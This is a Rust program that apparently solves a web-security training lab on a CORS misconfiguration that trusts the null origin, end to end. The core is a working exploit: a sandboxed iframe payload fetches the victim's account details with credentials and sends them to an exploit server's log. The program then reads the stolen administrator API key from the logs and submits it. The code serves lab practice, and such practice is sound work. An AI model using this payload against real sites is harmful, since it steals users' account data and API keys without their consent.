/***************************************************************
*
* Lab: CORS vulnerability with trusted null origin
*
* Hack Steps: 
*      1. Deliver the exploit to the victim
*      2. Fetch the exploit server log page
*      3. Extract the administrator's API key from the logs
*      4. Submit the solution
*
****************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0acb00bc03eda2d38029767e00ba00bf.web-security-academy.net";

// Change this to your exploit server URL
const EXPLOIT_SERVER_URL: &str =
    "https://exploit-0aac002d0330a2ec809f75bd01f100c7.exploit-server.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("â¦—1â¦˜ Delivering the exploit to the victim.. ");
    flush_terminal();

    let payload = format!(
        r###"<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
                fetch('{LAB_URL}/accountDetails', {{
                method: 'GET',
                credentials: 'include'
                }})
                .then(response => response.text())
                .then(data => {{
                    fetch('{EXPLOIT_SERVER_URL}/log?key=' + data);
                }});
                </script>"></iframe>"###
    );
    deliver_exploit_to_victim(&payload);

    println!("{}", "OK".green());
    print!("â¦—2â¦˜ Fetching the exploit server log page.. ");
    flush_terminal();

    let log_page = fetch_server_log_page();

    println!("{}", "OK".green());
    print!("â¦—3â¦˜ Extracting the administrator's API key from the logs.. ",);
    flush_terminal();

    let logs = log_page.text().unwrap();
    let api_key = capture_pattern_from_text("apikey%22:%20%22(.*)%22,", &logs);

    println!("{} => {}", "OK".green(), api_key.yellow());
    print!("â¦—4â¦˜ Submitting the solution.. ");
    flush_terminal();

    submit_solution(&api_key);

    println!("{}", "OK".green());
    println!("ðŸ—¹ The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn deliver_exploit_to_victim(payload: &str) {
    let response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8";
    WEB_CLIENT
        .post(EXPLOIT_SERVER_URL)
        .form(&HashMap::from([
            ("formAction", "DELIVER_TO_VICTIM"),
            ("urlIsHttps", "on"),
            ("responseFile", "/exploit"),
            ("responseHead", response_head),
            ("responseBody", payload),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "â¦—!â¦˜ Failed to deliver the exploit to the victim".red()
        ));
}

fn fetch_server_log_page() -> Response {
    WEB_CLIENT
        .get(format!("{EXPLOIT_SERVER_URL}/log"))
        .send()
        .expect(&format!("{}", "â¦—!â¦˜ Failed to fetch the logs".red()))
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "â¦—!â¦˜ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn submit_solution(answer: &str) {
    WEB_CLIENT
        .post(format!("{LAB_URL}/submitSolution"))
        .form(&HashMap::from([("answer", answer)]))
        .send()
        .expect(&format!("{}", "â¦—!â¦˜ Failed to submit the solution".red()));
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
